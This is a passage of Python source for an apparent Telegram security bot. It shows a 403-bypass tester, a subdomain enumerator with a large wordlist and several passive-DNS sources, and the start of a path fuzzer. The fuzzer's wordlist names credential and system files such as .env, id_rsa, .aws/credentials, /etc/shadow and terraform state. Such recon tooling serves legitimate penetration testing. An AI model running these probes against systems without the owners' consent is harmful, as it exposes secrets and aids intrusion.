    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    domain = urlparse(url).hostname
    path   = urlparse(url).path or "/"

    msg = await update.effective_message.reply_text(
        f"🔓 *Bypass Testing — `{domain}`*\n"
        f"Path: `{path}`\n\n"
        "Running 50+ bypass techniques...\n⏳",
        parse_mode='Markdown'
    )

    try:
        results = await asyncio.to_thread(_bypass_sync, url)
    except Exception as e:
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return

    baseline    = next((r for r in results if r.get("technique") == "Baseline"), None)
    baseline_st = baseline["status"] if baseline else "?"
    bypasses    = [r for r in results if r.get("bypassed")]
    tested      = len(results) - 1   # exclude baseline

    lines = [
        f"🔓 *Bypass Results — `{path}`*",
        f"🌐 `{domain}` | Baseline: `{baseline_st}`",
        f"🧪 Tested: `{tested}` techniques | ✅ Bypassed: `{len(bypasses)}`\n",
    ]

    if not bypasses:
        lines.append("🔒 No bypasses found — endpoint is well-protected.")
    else:
        lines.append(f"*🚨 {len(bypasses)} Bypass(es) Found:*")
        for b in bypasses[:15]:
            st_icon = "✅" if b["status"] in (200,201,204) else "↪️"
            lines.append(
                f"  {st_icon} `{b['status']}` [{b['method']}] `{b['label'][:55]}`"
            )
            if b["status"] in (301, 302):
                loc = b.get("headers", {}).get("Location", "")
                if loc:
                    lines.append(f"      → `{loc[:60]}`")

    # ── Summary by technique type ────────────────────
    tech_counts = {}
    for b in bypasses:
        t = b.get("technique", "other")
        tech_counts[t] = tech_counts.get(t, 0) + 1
    if tech_counts:
        lines.append("\n*By technique:*")
        for t, c in sorted(tech_counts.items(), key=lambda x: -x[1]):
            lines.append(f"  • `{t}`: {c}")

    lines.append("\n⚠️ _Authorized testing only._")

    # ── Export JSON if bypasses found ────────────────
    if bypasses:
        import io
        report = json.dumps({
            "url": url, "baseline_status": baseline_st,
            "tested": tested, "bypasses_found": len(bypasses),
            "bypass_details": [{
                "label": b["label"], "method": b["method"],
                "status": b["status"], "size": b["size"],
                "technique": b["technique"],
                "location": b.get("headers",{}).get("Location",""),
            } for b in bypasses],
            "all_results": [{
                "label": r["label"], "method": r["method"],
                "status": r["status"], "size": r["size"],
            } for r in results],
        }, indent=2)
        buf = io.BytesIO(report.encode())
        try:
            await msg.edit_text("\n".join(lines), parse_mode='Markdown')
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=buf,
                filename=f"bypass403_{domain}_{ts}.json",
                caption=f"🔓 Bypass report — `{domain}` — `{len(bypasses)}` bypasses",
                parse_mode='Markdown'
            )
        except Exception:
            await update.effective_message.reply_text("\n".join(lines)[:4000], parse_mode='Markdown')
    else:
        await msg.edit_text("\n".join(lines), parse_mode='Markdown')
    _active_scans.pop(uid, None)   # fix: release scan slot


# ══════════════════════════════════════════════════
# 📡  /subdomains — Advanced Subdomain Enumerator
# ══════════════════════════════════════════════════

_SUBDOMAIN_WORDLIST = [
    # ── Common / Generic ──────────────────────────
    "www","www2","www3","web","web1","web2","web3","site","sites","home",
    # ── Mail ──────────────────────────────────────
    "mail","mail2","smtp","pop","pop3","imap","mx","mx1","mx2","mx3",
    "webmail","email","exchange","autodiscover","autoconfig","relay",
    # ── FTP / File ────────────────────────────────
    "ftp","sftp","files","uploads","upload","download","downloads","media",
    "static","assets","cdn","cdn2","cdn3","images","img","imgs","pics",
    "video","videos","audio","docs","documents","resources","res",
    # ── Remote / Network ──────────────────────────
    "vpn","vpn2","remote","rdp","ssh","gateway","proxy","firewall",
    "router","switch","lb","loadbalancer","haproxy","nginx","apache",
    # ── API / Services ────────────────────────────
    "api","api2","api3","api4","apis","rest","graphql","grpc","ws","wss",
    "service","services","svc","microservice","backend","server","app",
    # ── Development ───────────────────────────────
    "dev","dev2","dev3","develop","development","devops","sandbox","lab",
    "labs","test","test2","test3","testing","uat","qa","qa2","qas","rc",
    "staging","stage","stage2","stg","stg2","beta","beta2","alpha","preview",
    "demo","demo2","old","legacy","v1","v2","v3","v4","new","next","canary",
    # ── Admin / Management ────────────────────────
    "admin","admin2","administrator","panel","portal","dashboard","manage",
    "manager","control","cpanel","whm","plesk","directadmin","webadmin",
    # ── Auth / Identity ───────────────────────────
    "login","auth","auth2","sso","oauth","id","identity","idp","saml",
    "account","accounts","user","users","profile","password","reset",
    # ── Databases ─────────────────────────────────
    "db","db1","db2","db3","database","mysql","postgres","postgresql","mssql",
    "oracle","redis","mongo","mongodb","elasticsearch","elastic","memcache",
    "cache","cassandra","clickhouse","influx","influxdb","timeseries",
    # ── DevOps / CI-CD ────────────────────────────
    "ci","cd","build","deploy","jenkins","jenkins2","gitlab","github",
    "bitbucket","gitea","gogs","drone","travis","circleci","teamcity",
    "sonar","sonarqube","nexus","artifactory","registry","docker","harbor",
    "k8s","kubernetes","rancher","portainer","nomad","consul","vault",
    # ── Monitoring / Observability ────────────────
    "monitor","monitoring","status","grafana","prometheus","kibana",
    "elastic","logstash","fluentd","zabbix","nagios","datadog","newrelic",
    "sentry","jaeger","zipkin","alertmanager","pagerduty","ops","opsgenie",
    # ── Communication / Collaboration ────────────
    "chat","slack","teams","meet","conference","jitsi","zoom","webex",
    "forum","forums","community","board","helpdesk","support","ticket",
    "tickets","jira","confluence","wiki","kb","docs2","notion","redmine",
    # ── Cloud / Infrastructure ────────────────────
    "aws","azure","gcp","cloud","cloud2","heroku","netlify","vercel",
    "s3","bucket","storage","backup","backup2","archive","dr","disaster",
    "infra","infrastructure","internal","intranet","corp","corporate",
    "private","secure","ssl","tls","hq","office","dc","datacenter",
    # ── DNS / Network ─────────────────────────────
    "ns","ns1","ns2","ns3","ns4","dns","dns1","dns2","rdns","ntp","time",
    "node","node1","node2","host","host1","host2","server1","server2",
    # ── E-commerce / Business ─────────────────────
    "shop","store","cart","checkout","payment","pay","billing","invoice",
    "orders","shipping","logistics","erp","crm","pos","inventory",
    "affiliate","partner","partners","reseller","wholesale","b2b","b2c",
    # ── Content / Marketing ───────────────────────
    "blog","news","press","media2","content","cms","wp","wordpress","ghost",
    "assets2","static2","events","calendar","jobs","careers","hiring",
    "about","contact","info","landing","marketing","promo","campaign",
    # ── Regional / Geographic ─────────────────────
    "us","us1","us2","eu","eu1","eu2","asia","uk","au","jp","de","fr",
    "ca","in","br","sg","kr","cn","ru","nl","ch","se","no","fi","dk",
    "prod","production","live","global","int","external","ext",
    # ── Security / Scan ───────────────────────────
    "scan","pentest","security","sec","waf","ids","ips","siem","cert",
    "bug","vuln","disclosure","abuse","noc","soc","csirt","ir",
    # ── Misc common ───────────────────────────────
    "app","apps","mobile","m","wap","pwa","ios","android","native",
    "analytics","stats","data","report","reporting","bi","insight",
    "notifications","push","webhook","hooks","events2","stream","streaming",
    "broadcast","live2","feed","feeds","rss","atom","sitemap",
    "error","errors","exception","log","logs","logging","trace","debug",
    "health","ping","check","heartbeat","probe","uptime","availability",
    # ── Uncommon but valid ────────────────────────
    "sandbox2","mock","mocks","stub","fixture","load","loadtest","perf",
    "bench","benchmark","chaos","canary2","feature","flag","flags","edge",
    "origin","origin2","direct","bypass","raw","internal2","private2",
    "secret","hidden","mgmt","management","syslog","audit","compliance",
    "archive2","readonly","mirror","replica","slave","read","write",
    "primary","secondary","master","worker","worker1","worker2","cron",
    "queue","mq","rabbitmq","kafka","nats","pubsub","broker","bus",
    "search","solr","sphinx","meilisearch","typesense","algolia",
    "image","image2","thumb","thumbnail","resize","crop","transform",
    "socket","ws2","realtime","rt","sse","long-poll",
    "pay2","stripe","paypal","braintree","adyen","klarna","crypto","wallet",
    "oauth2","sso2","token","refresh","jwt","session","cookie",
    "export","import","migrate","etl","pipeline","batch","job","jobs2",
    "ml","ai","model","models","inference","predict","classify","nlp",
    "map","maps","geo","location","gis","spatial","routing","places",
    "short","link","url","redirect","track","click","pixel","tag",
    "form","forms","survey","poll","quiz","vote","review","rating",
    "invoice2","quote","contract","legal","tos","privacy","gdpr",
    "notify","notification","sms","otp","verify","verification","2fa",
]

def _subdomains_sync(domain: str, progress_q: list) -> dict:
    """Enumerate subdomains via crt.sh + DNS brute-force + HackerTarget."""
    results      = {"crtsh": [], "bruteforce": [], "hackertarget": [], "errors": []}
    found_all    = set()


    # ── Source 1: crt.sh (Certificate Transparency) ─
    progress_q.append("🔍 Querying crt.sh (Certificate Transparency)...")
    try:
        r = requests.get(
            f"https://crt.sh/?q=%.{domain}&output=json",
            timeout=15, headers={"Accept": "application/json"}
        )
        if r.status_code == 200:
            seen = set()
            for entry in r.json():
                names = entry.get("name_value", "").split("\n")
                for name in names:
                    name = name.strip().lower().lstrip("*.")
                    if name.endswith(f".{domain}") or name == domain:
                        sub = name.replace(f".{domain}", "").replace(domain, "")
                        if sub and sub not in seen and len(sub) < 60:
                            seen.add(sub)
                            results["crtsh"].append(name)
                            found_all.add(name)
            progress_q.append(f"✅ crt.sh: `{len(results['crtsh'])}` subdomains found")
    except Exception as e:
        results["errors"].append(f"crt.sh: {e}")

    # ── Source 2: HackerTarget API (free) ────────────
    progress_q.append("🔍 Querying HackerTarget API...")
    try:
        r = requests.get(
            f"https://api.hackertarget.com/hostsearch/?q={domain}",
            timeout=12
        )
        if r.status_code == 200 and "error" not in r.text.lower()[:30]:
            for line in r.text.strip().split("\n"):
                if "," in line:
                    hostname = line.split(",")[0].strip().lower()
                    if hostname.endswith(f".{domain}"):
                        found_all.add(hostname)
                        results["hackertarget"].append(hostname)
            progress_q.append(f"✅ HackerTarget: `{len(results['hackertarget'])}` found")
    except Exception as e:
        results["errors"].append(f"HackerTarget: {e}")

    # ── Source 3: AlienVault OTX (passive DNS) ────── ✅ V23 New
    progress_q.append("🔍 Querying AlienVault OTX (passive DNS)...")
    try:
        r = requests.get(
            f"https://otx.alienvault.com/api/v1/indicators/domain/{domain}/passive_dns",
            headers={"Accept": "application/json"},
            timeout=12
        )
        otx_count = 0
        if r.status_code == 200:
            data_otx = r.json()
            for entry in data_otx.get("passive_dns", []):
                h = entry.get("hostname", "").strip().lower()
                if h.endswith(f".{domain}") and h not in found_all:
                    found_all.add(h)
                    results.setdefault("otx", []).append(h)
                    otx_count += 1
        progress_q.append(f"✅ OTX: `{otx_count}` found")
    except Exception as e:
        results["errors"].append(f"OTX: {e}")

    # ── Source 5: URLScan.io ────────────────────────── ✅ V24 New
    progress_q.append("🔍 Querying URLScan.io...")
    try:
        r = requests.get(
            f"https://urlscan.io/api/v1/search/?q=domain:{domain}&size=200",
            headers={"Accept": "application/json"},
            timeout=12
        )
        urlscan_count = 0
        if r.status_code == 200:
            data_us = r.json()
            for result in data_us.get("results", []):
                page_url = result.get("page", {}).get("url", "")
                if page_url:
                    try:
                        from urllib.parse import urlparse as _up
                        h = _up(page_url).netloc.lower()
                        if h and h.endswith(f".{domain}") and h not in found_all:
                            found_all.add(h)
                            results.setdefault("urlscan", []).append(h)
                            urlscan_count += 1
                    except Exception:
                        pass
        progress_q.append(f"✅ URLScan: `{urlscan_count}` found")
    except Exception as e:
        results["errors"].append(f"URLScan: {e}")

    # ── Source 6: RapidDNS ─────────────────────────── ✅ V24 New
    progress_q.append("🔍 Querying RapidDNS...")
    try:
        r = requests.get(
            f"https://rapiddns.io/subdomain/{domain}?full=1",
            headers={"User-Agent": "Mozilla/5.0", "Accept": "text/html"},
            timeout=12
        )
        rapiddns_count = 0
        if r.status_code == 200:
            # Parse table rows
            for m in re.finditer(r'<td[^>]*>([a-z0-9][a-z0-9\-\.]*\.' + re.escape(domain) + r')</td>', r.text, re.I):
                h = m.group(1).strip().lower()
                if h.endswith(f".{domain}") and h not in found_all:
                    found_all.add(h)
                    results.setdefault("rapiddns", []).append(h)
                    rapiddns_count += 1
        progress_q.append(f"✅ RapidDNS: `{rapiddns_count}` found")
    except Exception as e:
        results["errors"].append(f"RapidDNS: {e}")

    # ── Source 4: DNS Brute-force ────────────────────
    progress_q.append(f"🔍 DNS brute-force ({len(_SUBDOMAIN_WORDLIST)} words)...")
    live_subs  = []
    wildcard_ip = None

    # Wildcard detection
    try:
        wc_ip = socket.gethostbyname(f"thissubdomaindoesnotexist99.{domain}")
        wildcard_ip = wc_ip
        progress_q.append(f"⚠️ Wildcard DNS detected (`{wc_ip}`) — filtering...")
    except socket.gaierror:
        pass

    def _check_sub(word):
        hostname = f"{word}.{domain}"
        try:
            ip = socket.gethostbyname(hostname)
            # Filter wildcard
            if wildcard_ip and ip == wildcard_ip:
                return None
            return (hostname, ip)
        except socket.gaierror:
            return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=25) as ex:
        futs = {ex.submit(_check_sub, w): w for w in _SUBDOMAIN_WORDLIST}
        done = 0
        try:
            for fut in concurrent.futures.as_completed(futs, timeout=60):
                done += 1
                if done % 50 == 0:
                    progress_q.append(f"🔍 Brute-force: `{done}/{len(_SUBDOMAIN_WORDLIST)}` tested | `{len(live_subs)}` live")
                try:
                    res = fut.result(timeout=4)
                    if res:
                        hostname, ip = res
                        live_subs.append({"hostname": hostname, "ip": ip})
                        found_all.add(hostname)
                except Exception:
                    pass
        except concurrent.futures.TimeoutError:
            for f in futs:
                f.cancel()
            progress_q.append(f"⚠️ DNS brute-force timeout — partial: `{done}/{len(_SUBDOMAIN_WORDLIST)}` | `{len(live_subs)}` live")

    results["bruteforce"] = live_subs
    progress_q.append(f"✅ Brute-force: `{len(live_subs)}` live subdomains")

    # ── Deduplicate and resolve all found ────────────
    all_unique = sorted(found_all)
    resolved   = {}
    for h in all_unique[:100]:
        try:
            resolved[h] = socket.gethostbyname(h)
        except Exception:
            resolved[h] = "unresolved"

    # ── HTTP live check + page title fetch ──────────  ✅ V23 Enhanced
    progress_q.append(f"🌐 HTTP live check + title fetch for top `{min(50, len(all_unique))}` subdomains...")
    http_status: dict = {}

    # ✅ V23: Interesting subdomain keywords to highlight
    _INTERESTING_KEYWORDS = {
        'admin', 'dashboard', 'panel', 'manage', 'portal', 'internal',
        'staging', 'stage', 'dev', 'beta', 'test', 'uat', 'qa',
        'db', 'database', 'mysql', 'redis', 'mongo', 'backup',
        'api', 'graphql', 'auth', 'login', 'sso', 'id', 'oauth',
        'jenkins', 'gitlab', 'git', 'ci', 'deploy', 'build',
        'grafana', 'kibana', 'prometheus', 'monitor', 'status',
        'mail', 'smtp', 'vpn', 'remote', 'ssh', 'ftp',
    }

    def _http_check(hostname):
        for scheme in ("https", "http"):
            try:
                r = requests.get(
                    f"{scheme}://{hostname}",
                    headers=_get_headers(), timeout=6,
                    verify=False, allow_redirects=True
                )
                # ✅ V23: Extract page title
                title = ""
                if r.status_code == 200 and 'html' in r.headers.get('Content-Type', ''):
                    try:
                        soup_t = BeautifulSoup(r.text[:3000], 'html.parser')
                        t = soup_t.find('title')
                        if t and t.string:
                            title = t.string.strip()[:60]
                    except Exception:
                        pass
                # ✅ V23: Flag interesting subdomains
                sub_name = hostname.split('.')[0].lower()
                is_interesting = any(kw in sub_name for kw in _INTERESTING_KEYWORDS)
                return hostname, r.status_code, scheme, title, is_interesting
            except Exception:
                continue
        return hostname, None, None, "", False

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
        http_futs = {ex.submit(_http_check, h): h for h in all_unique[:50]}
        try:
            for fut in concurrent.futures.as_completed(http_futs, timeout=50):
                try:
                    h, status, scheme, title, is_interesting = fut.result(timeout=8)
                    if status:
                        http_status[h] = {
                            "status": status, "scheme": scheme,
                            "title": title, "interesting": is_interesting
                        }
                except Exception:
                    pass
        except concurrent.futures.TimeoutError:
            for f in http_futs: f.cancel()

    results["all_unique"]        = all_unique
    results["resolved"]          = resolved
    results["http_status"]       = http_status
    results["total_unique"]      = len(all_unique)
    results["wildcard_detected"] = wildcard_ip is not None
    # ✅ V23: Interesting subdomains summary
    results["interesting"] = [
        h for h, info in http_status.items() if info.get("interesting")
    ]

    _active_scans.pop(uid, None)
    return results


async def cmd_subdomains(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/subdomains <domain> — Advanced subdomain enumeration"""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/subdomains example.com`\n\n"
            "📡 *6 sources combined:*\n"
            "  ① crt.sh — Certificate Transparency logs (passive)\n"
            "  ② HackerTarget API — public dataset\n"
            "  ③ AlienVault OTX — passive DNS\n"
            "  ④ URLScan.io — crawl history\n"
            "  ⑤ RapidDNS — DNS history\n"
            f"  ⑥ DNS brute-force — {len(_SUBDOMAIN_WORDLIST)} wordlist\n\n"
            "🛡 Wildcard DNS auto-detection & filtering\n"
            "📦 Exports full list as `.txt` + `.json` files",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return
    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ *`{_active_scans[uid]}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
            "သို့မဟုတ် `/stop` နှိပ်ပါ", parse_mode='Markdown')
        return
    _active_scans[uid] = "Subdomain scan"
    # Skip rate limit if called internally from /discover
    if not context.user_data.get('_discover_internal'):
        allowed, wait = check_rate_limit(uid)
        if not allowed:
            await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
            return

    raw = context.args[0].strip().replace("https://","").replace("http://","").split("/")[0].lower()

    # Basic domain validation
    if not re.match(r'^[a-z0-9][a-z0-9\-.]+\.[a-z]{2,}$', raw):
        await update.effective_message.reply_text("❌ Invalid domain format. Example: `example.com`", parse_mode='Markdown')
        return

    # SSRF: block private IPs for the apex domain
    try:
        apex_ip = socket.gethostbyname(raw)
        if not _is_safe_ip(apex_ip):
            await update.effective_message.reply_text(f"🚫 Private IP blocked: `{apex_ip}`", parse_mode='Markdown')
            return
    except socket.gaierror:
        pass  # domain may not have A record — still continue

    msg = await update.effective_message.reply_text(
        f"📡 *Subdomain Enumeration — `{raw}`*\n\n"
        f"① crt.sh  ② HackerTarget  ③ AlienVault OTX\n"
        f"④ URLScan.io  ⑤ RapidDNS\n"
        f"⑥ DNS brute-force ({len(_SUBDOMAIN_WORDLIST)} words)\n\n⏳",
        parse_mode='Markdown'
    )

    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(4)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"📡 *Enumerating `{raw}`*\n\n{txt}", parse_mode='Markdown')
                except Exception:
                    pass

    prog = asyncio.create_task(_prog())
    try:
        data = await asyncio.to_thread(_subdomains_sync, raw, progress_q)
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return
    finally:
        _active_scans.pop(uid, None)
        prog.cancel()

    total    = data["total_unique"]
    resolved = data["resolved"]
    http_st  = data.get("http_status", {})
    crtsh_c  = len(data["crtsh"])
    ht_c     = len(data["hackertarget"])
    bf_c     = len(data["bruteforce"])
    otx_c    = len(data.get("otx", []))
    urlscan_c = len(data.get("urlscan", []))
    rapiddns_c = len(data.get("rapiddns", []))
    wc       = data["wildcard_detected"]
    interesting_subs = data.get("interesting", [])

    lines = [
        f"📡 *Subdomain Enumeration — `{raw}`*",
        f"━━━━━━━━━━━━━━━━━━━━",
        f"🔎 Total unique: `{total}`",
        f"  crt.sh:       `{crtsh_c}`",
        f"  HackerTarget: `{ht_c}`",
        f"  AlienVault:   `{otx_c}`",         # ✅ V23
        f"  URLScan.io:   `{urlscan_c}`",      # ✅ V24
        f"  RapidDNS:     `{rapiddns_c}`",     # ✅ V24
        f"  Brute-force:  `{bf_c}` live",
        f"{'⚠️ Wildcard DNS detected & filtered' if wc else '✅ No wildcard DNS'}\n",
    ]

    # ✅ V23: Interesting subdomains section first
    if interesting_subs:
        lines.append(f"*🔴 Interesting Subdomains ({len(interesting_subs)}):*")
        for h in interesting_subs[:10]:
            ip      = resolved.get(h, "?")
            st_info = http_st.get(h, {})
            scheme  = st_info.get("scheme", "https")
            status  = st_info.get("status", "?")
            title   = st_info.get("title", "")
            title_str = f" — _{title}_" if title else ""
            lines.append(f"  🔴 `{h}` [{scheme.upper()} {status}]{title_str}")
        lines.append("")

    # Show top results with HTTP status
    if data["all_unique"]:
        live_http  = [h for h in data["all_unique"] if h in http_st and http_st[h]["status"] == 200]
        other_http = [h for h in data["all_unique"] if h not in live_http]

        if live_http:
            lines.append(f"*🟢 Live HTTP ({len(live_http)}):*")
            for h in live_http[:20]:
                ip      = resolved.get(h, "?")
                st_info = http_st.get(h, {})
                scheme  = st_info.get("scheme", "https")
                status  = st_info.get("status", "?")
                title   = st_info.get("title", "")           # ✅ V23
                flag    = " 🔴" if st_info.get("interesting") else ""
                title_str = f" _{title[:40]}_" if title else ""
                lines.append(f"  `{h}` → `{ip}` [{scheme.upper()} {status}]{flag}{title_str}")
            lines.append("")

        if other_http:
            lines.append(f"*📡 DNS Only — No HTTP ({len(other_http)}):*")
            for h in other_http[:15]:
                ip   = resolved.get(h, "?")
                flag = ""
                for keyword in ("dev","staging","admin","internal","test","beta","old","backup","api"):
                    if keyword in h:
                        flag = " 🔴"
                        break
                lines.append(f"  `{h}` → `{ip}`{flag}")
            if len(other_http) > 15:
                lines.append(f"  _…{len(other_http)-15} more in export_")

        if total > 35:
            lines.append(f"\n  _…and {total-35} more in export file_")

    lines.append("\n📦 _Full list exported below_")

    await msg.edit_text("\n".join(lines), parse_mode='Markdown')

    # ── Export files ──────────────────────────────────
    import io
    txt_content  = "\n".join(
        f"{h}\t{resolved.get(h,'?')}" for h in data["all_unique"]
    )
    json_content = json.dumps({
        "domain": raw, "scanned_at": datetime.now().isoformat(),
        "total_unique": total, "wildcard_detected": wc,
        "sources": {
            "crtsh": crtsh_c, "hackertarget": ht_c,
            "alienvault_otx": otx_c, "urlscan": urlscan_c,
            "rapiddns": rapiddns_c, "bruteforce": bf_c  # ✅ V24
        },
        "subdomains": [{
            "hostname": h, "ip": resolved.get(h,"?"),
            "http_status": http_st.get(h, {}).get("status"),
            "scheme": http_st.get(h, {}).get("scheme"),
            "title": http_st.get(h, {}).get("title", ""),  # ✅ V23
            "interesting": http_st.get(h, {}).get("interesting", False)  # ✅ V23
        } for h in data["all_unique"]],
    }, indent=2)

    import zipfile as _zf2
    zip_buf = io.BytesIO()
    ts      = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_d  = re.sub(r'[^\w\-]', '_', raw)
    with _zf2.ZipFile(zip_buf, 'w', _zf2.ZIP_DEFLATED) as zf:
        zf.writestr("subdomains.txt",  txt_content.encode())
        zf.writestr("subdomains.json", json_content.encode())
        interesting = [h for h in data["all_unique"]
                       if any(k in h for k in ("dev","staging","admin","internal","test","backup","api","panel","manage","portal","jenkins","gitlab","grafana","kibana"))]
        zf.writestr("interesting.txt", "\n".join(interesting).encode())
    zip_buf.seek(0)

    await context.bot.send_document(
        chat_id=update.effective_chat.id,
        document=zip_buf,
        filename=f"subdomains_{safe_d}_{ts}.zip",
        caption=(
            f"📡 *Subdomains — `{raw}`*\n"
            f"Total: `{total}` | Interesting: `{len(interesting)}`\n"
            f"Files: `subdomains.txt` + `interesting.txt` + `subdomains.json`"
        ),
        parse_mode='Markdown'
    )


# ══════════════════════════════════════════════════
# 🧪  /fuzz — HTTP Path & Parameter Fuzzer
# ══════════════════════════════════════════════════

_FUZZ_PATHS = [
    # ── Admin / Login / Dashboard ──────────────────
    "admin","admin/","administrator","admin.php","admin/login","admin/login.php",
    "admin/index.php","admin/dashboard","admin/panel","admin/console",
    "admin/users","admin/settings","admin/config","admin/api",
    "login","login.php","login.html","login/","signin","sign-in",
    "dashboard","panel","control","manage","manager","management",
    "cpanel","whm","plesk","directadmin","webmin","webadmin",
    "wp-admin","wp-admin/","wp-login.php","wp-login",
    "portal","console","controlpanel","backoffice","backend",
    # ── Debug / Dev ────────────────────────────────
    "debug","debug.php","debug/","test","test.php","testing","dev","devel",
    "development","staging","beta","alpha","old","demo","sandbox","lab",
    "trace","profiler","xdebug","phpstorm","ide","editor",
    # ── Backup / Dump files ────────────────────────
    "backup","backup/","backup.zip","backup.tar","backup.tar.gz","backup.sql",
    "backup.bak","dump.sql","db.sql","db.zip","database.sql","database.bak",
    "site.zip","site.tar.gz","full_backup.zip","files.zip","www.zip",
    "index.php.bak","index.html.bak","index.bak","app.bak",
    "config.php.bak","config.bak","wp-config.php.bak","web.config.bak",
    "data.sql","data.dump","schema.sql","export.sql","mysql.sql",
    "2023_backup.sql","2024_backup.sql","backup_old.zip","old_site.zip",
    # ── Environment / Config files ─────────────────
    ".env",".env.bak",".env.old",".env.example",".env.sample",
    ".env.local",".env.development",".env.production",".env.staging",
    ".env.test",".env.docker","env.txt","environment.txt",
    "config.php","config.inc.php","config.yml","config.yaml","config.json",
    "config.xml","config.ini","config.cfg","config.conf","config/app.php",
    "configuration.php","settings.php","settings.py","settings.json",
    "database.yml","database.json","database.php","db.php","db.ini",
    "credentials.json","credentials.yml","secrets.json","secrets.yml",
    "application.properties","application.yml","application.yaml",
    "appsettings.json","web.config","app.config","app.conf",
    ".htpasswd",".htaccess","nginx.conf","apache.conf","httpd.conf",
    # ── Info disclosure ────────────────────────────
    "info.php","phpinfo.php","phpinfo","php_info.php","server-info",
    "server-status","nginx_status","mod_status","status","health",
    "health/","healthcheck","ping","ping/","version","build","build-info",
    "api/version","api/health","api/status","actuator","actuator/health",
    "actuator/info","actuator/env","actuator/beans","actuator/mappings",
    "actuator/metrics","actuator/loggers","actuator/threaddump",
    "metrics","prometheus","stats","diagnostics","diagnostic",
    # ── Source / VCS leaks ─────────────────────────
    ".git",".git/","git/config",".git/config",".git/HEAD",".git/FETCH_HEAD",
    ".git/index",".git/logs/HEAD",".git/refs/heads/master",
    ".git/refs/heads/main",".svn",".svn/entries",".hg",".hg/store",
    ".bzr","CVS","CVS/Entries",".gitignore",".gitattributes",
    "web.config","web.config.bak","crossdomain.xml","clientaccesspolicy.xml",
    # ── Robots / Sitemaps / Well-known ────────────
    "robots.txt","sitemap.xml","sitemap_index.xml","sitemap-news.xml",
    "sitemap-video.xml","sitemap-image.xml","news-sitemap.xml",
    "humans.txt","security.txt",".well-known/security.txt",
    ".well-known/openapi.json",".well-known/jwks.json",
    ".well-known/change-password",".well-known/assetlinks.json",
    "readme.md","README.md","README.txt","CHANGELOG.md","CHANGELOG.txt",
    "LICENSE","LICENSE.md","Dockerfile","docker-compose.yml",
    # ── CMS specific ───────────────────────────────
    "wp-config.php","xmlrpc.php","wp-json","wp-cron.php",
    "wp-content/debug.log","wp-content/uploads/","wp-content/plugins/",
    "wp-includes/","wp-json/wp/v2/users",
    "administrator/","administrator/index.php","configuration.php",
    "joomla","drupal","typo3","magento","prestashop","opencart",
    "config/database.yml","app/etc/config.php","app/etc/env.php",
    "includes/config.php","includes/configure.php",
    "catalogue/","catalog/","store/","shop/",
    # ── API / GraphQL / Docs ───────────────────────
    "api","api/","api/v1","api/v2","api/v3","api/v4",
    "api/users","api/admin","api/auth","api/login","api/register",
    "graphql","graphql/","graphiql","api/graphql",
    "swagger.json","openapi.json","openapi.yaml","swagger.yaml",
    "api-docs","swagger-ui.html","swagger-ui","redoc","docs",
    "v1","v2","v3","rest","rest/api","jsonapi",
    # ── Logs / Monitoring ─────────────────────────
    "error.log","access.log","debug.log","app.log","laravel.log",
    "server.log","application.log","system.log","install.log","update.log",
    "storage/logs/laravel.log","storage/logs/","logs/","log/",
    "logs/error.log","logs/debug.log","logs/app.log","var/log/app.log",
    "tmp/logs/","tmp/log/","temp/log/",
    # ── Common dirs / uploads ─────────────────────
    "uploads","uploads/","files","files/","static","static/","assets","assets/",
    "media","media/","public","public/","private","private/",
    "download","downloads","export","exports","report","reports",
    "images","img","js","css","fonts","font","data","dist","build",
    "tmp","temp","cache","sessions","storage","vendor","node_modules",
    # ── DevOps / Cloud ─────────────────────────────
    "jenkins","jenkins/","gitlab","gitlab/","jira","confluence","sonar",
    "nexus","artifactory","registry","harbor","rancher","portainer",
    "grafana","kibana","prometheus","alertmanager","elastic","logstash",
    "phpmyadmin","phpmyadmin/","adminer.php","adminer","pgadmin",
    "mongo-express","redis-commander","flower","celery",
    "k8s","kubernetes","consul","vault","nomad",
    # ── Hidden / Sensitive files ───────────────────
    "id_rsa","id_rsa.pub","authorized_keys","known_hosts","ssh_host_rsa_key",
    "passwd","shadow","hosts","resolv.conf","sudoers",
    "aws/credentials",".aws/credentials",".aws/config",
    "boto.cfg",".boto",".netrc",".npmrc",".pypirc",".docker/config.json",
    "terraform.tfvars","terraform.tfstate","terraform.tfstate.backup",
    "Jenkinsfile","Makefile","Vagrantfile","Procfile",
    # ── Spring Boot / Java ─────────────────────────
    "h2-console","h2-console/","jolokia","jolokia/","hawtio","hawtio/",
    "druid","druid/","druid/index.html","index.action",
    "hystrix.stream","turbine.stream",
    # ── Laravel / PHP ──────────────────────────────
    "telescope","telescope/","horizon","horizon/","telescope/api/requests",
    "horizon/api/stats","debugbar","_debugbar","_ignition",
    "clockwork","clockwork/",
    # ── Python / Django / Flask ────────────────────
    "django-admin","admin/doc/","silk/","silk/api/","rosetta/",
    "__pycache__/","__debug__/","werkzeug",
    # ── Node.js ────────────────────────────────────
    ".nvmrc",".node-version","package-lock.json","yarn.lock","pnpm-lock.yaml",
    "node_modules/.package-lock.json",
    # ── Ruby on Rails ─────────────────────────────
    "rails/info/properties","rails/mailers","sidekiq","sidekiq/",
    "letter_opener","flipper","flipper/api",
